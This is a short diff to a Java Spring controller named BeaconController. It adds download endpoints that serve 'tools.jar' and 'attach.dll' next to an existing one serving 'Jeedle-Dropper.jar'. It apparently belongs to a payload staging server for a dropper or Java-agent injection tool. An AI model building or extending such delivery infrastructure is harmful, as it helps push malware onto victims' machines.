@@ -29,9 +29,14 @@ public class BeaconController {
         return fileResponse("Jeedle-Dropper.jar");
     }
 
-    @GetMapping("downloadResource")
-    public ResponseEntity<Resource> downloadResource() throws IOException {
+    @GetMapping("downloadResourceJ")
+    public ResponseEntity<Resource> downloadJarResource() throws IOException {
         return fileResponse("tools.jar");
+    }
+
+    @GetMapping("downloadResourceB")
+    public ResponseEntity<Resource> downloadDllResource() throws IOException {
+        return fileResponse("attach.dll");
     }
 
     public ResponseEntity<Resource> fileResponse(String fileName) throws IOException {
